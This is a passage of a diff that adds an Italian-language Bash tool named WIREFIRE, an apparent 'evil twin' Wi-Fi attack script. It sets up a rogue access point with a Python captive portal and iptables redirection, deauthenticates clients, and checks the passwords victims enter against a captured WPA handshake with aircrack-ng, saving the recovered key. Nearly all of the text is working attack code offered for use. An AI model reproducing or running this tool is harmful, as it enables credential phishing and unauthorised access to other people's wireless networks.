+cp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+cp.bind(('0.0.0.0', 80))
+cp.listen(1)
+print '[*] Captive portal hosted'
+
+while True:
+	try:
+		conn, addr = cp.accept()
+		thread.start_new_thread ( responder, (conn, addr, captive))
+	except:
+		print '[!] Error while responding...'
+
+") > captive_responder.py
+
+	python captive_responder.py > /dev/null &
+	echo "$!" > "/tmp/captive_responder_pid" 
+
+	###########################################################
+
+	iptables -P INPUT DROP
+	iptables -P OUTPUT DROP
+	iptables -P FORWARD DROP
+
+	iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --sport 80 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --sport 8000 -j ACCEPT
+	iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
+	iptables -A INPUT -p tcp -m tcp --dport 8000 -j ACCEPT
+
+	iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --dport 8000 -j ACCEPT
+	iptables -A OUTPUT -p udp -m udp --sport 53 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --sport 443 -j ACCEPT
+	iptables -A OUTPUT -p tcp -m tcp --sport 8000 -j ACCEPT
+
+	iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $default_gateway:53
+	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $default_gateway:80
+	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $default_gateway:443
+	iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination $default_gateway:8000
+
+	iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+	iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
+
+	iptables -A INPUT -i $WIFI -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+	iptables -A OUTPUT -o $WIFI -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
+
+	###########################################################
+	echo
+	echo "###########################################################"
+	echo "#                      Started                            #"
+	echo "###########################################################"
+}
+
+function checkpass
+{
+	#controlla se la pass è uguale
+	echo -e "     "$yellow "Controllo se la password inserita è corretta"$transparent
+	echo
+	aircrack-ng $DUMP_PATH/$Host_MAC-01.cap -w /var/www/captive_portal/users.txt | grep "KEY" > try.txt
+	cat try.txt | awk '{print $4}' > try2.txt
+	sed '$d' try2.txt > pass.txt
+	rm try.txt try2.txt
+	cp pass.txt /var/www/captive_portal/pass.txt
+	if [ -s pass.txt ]; then
+		echo "	Complimenti per la botta di culo!!!"
+		echo
+		echo "	Troverai la password del wifi nel file --> pass.txt"	
+		echo
+		echo "	Puoi chiudere il programma è controllare la password!!!"
+		killall aireplay-ng
+		sleep 10000000000
+	fi
+		echo -e "          "$red"La password inserita era errata!!!"$transparent
+		rm /var/www/captive_portal/users.txt
+		touch /var/www/captive_portal/users.txt
+		chmod 666 /var/www/captive_portal/users.txt
+		sleep 5
+		dopoAP
+}
+
+function dopoAP
+{	
+	while true; do
+		conditional_clear
+		top
+		if [ -s /var/www/captive_portal/users.txt ]; then
+			checkpass
+		fi
+		echo -e ""$red"			ANCORA NESSUN RISULTATO !"$transparent
+		echo
+		echo
+		echo
+		out=$(dhcp-lease-list --last --parsable)
+		#out2=${out:113}
+		echo -e "     "$blue $out""$transparent
+		sleep 7
+	done
+}
+
+function webinterface
+{
+	chmod 400 /root/server.pem
+
+	while true; do
+		conditional_clear
+		top
+		echo "Sei sicuro di voler procedere con queste impostazioni? (Y/N)"
+		echo " "
+		echo
+		echo "Interfaccia: $WIFI"
+		echo "Canale:      $channel"
+		echo "Essid:       $Host_SSID"
+		echo "Bssid:       $Host_MAC"
+		echo "Modulo_Web:  $modulo_web"
+		echo "Wpa:         0"
+		echo
+		echo -n "      #> "
+		read lst
+		echo 
+		if [ $lst == "Y" ] || [ $lst == "y" ]; then
+			while true; do
+				conditional_clear
+				top
+				echo
+				echo -e "Procedo con l'interfaccia web"
+				echo
+				sleep 2
+				killatutto
+				creaAP
+				sleep 5
+				timer=0
+				deauthall
+				dopoAP
+			done
+		elif [ $lst == "N" ] || [ $lst == "n" ]; then
+			module_select
+		else 
+			webinterface
+		fi
+	done
+}
+
+function fx_backup_config
+{
+	if [ -d "backup/" ]; then
+		echo "[!] Error, you have to restore a pending backup, try:"
+		exit 1	
+	else
+		mkdir backup/
+		
+		cp /etc/apache2/sites-available/000-default.conf backup/
+		cp /etc/apache2/sites-available/default-ssl.conf backup/
+		cp /etc/apache2/ports.conf backup/
+
+		cp /etc/bind/named.conf backup/
+
+		iptables-save > backup/iptables_config.txt
+
+		chmod 000 backup/
+	fi
+
+}
+
+function menu
+{
+	general_back="Back"
+	general_error_1="Not_Found"
+	general_case_error="Unknown option. Choose again"
+	general_exitmode="Cleaning and closing"
+	general_exitmode_1="Disabling monitoring interface"
+	general_exitmode_2="Disabling interface"
+	general_exitmode_3="Disabling "$grey"forwarding of packets"
+	general_exitmode_4="Cleaning "$grey"iptables"
+	general_exitmode_5="Restoring "$grey"tput"
+	general_exitmode_6="Restarting "$grey"Network-Manager"
+	general_exitmode_7="Cleanup performed successfully!"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	setinterface
+}
+
+##################################### < FINE FUNZIONI > #####################################
+
+############################################## < MAIN > ##############################################
+clear
+echo 
+echo -e "$green "
+echo -e "         &         &   &   &&&&    &&&&&   &&&&&   &   &&&&   &&&&&"
+echo -e "         &  &   &  &   &   &   &   &       &       &   &   &  &    "   
+echo -e "          &  & &  &    &   &&&&    &&&&    &&&&    &   &&&&   &&&&"
+echo -e "           &  &  &     &   &  &    &       &       &   &  &   &   "
+echo -e "            &   &      &   &   &   &&&&&   &       &   &   &  &&&&&"
+echo -e "        ____________________________________________________________ "
+echo
+sleep 0.5
+echo -e $red"                               WIREFIRE "$version""$transparent
+echo 
+sleep 0.5
+#echo -e $red "          https://Hotwire21@bitbucket.org/Hotwire21/rasp_flux  "$transparent
+echo
+echo
+sleep 3
+# Create working directory
+if [ ! -d $DUMP_PATH ]; then
+	mkdir -p $DUMP_PATH &>$null_output
+fi
+if [ ! -d $HANDSHAKE_PATH ]; then
+        mkdir -p $HANDSHAKE_PATH &>$null_output
+fi
+if [ ! -d $PASSLOG_PATH ]; then
+        mkdir -p $PASSLOG_PATH &>$null_output
+fi
+chmod +x airmon
+checkdependences
+menu
+
+
+
+
+
+
+
+
+
+
+
+
+
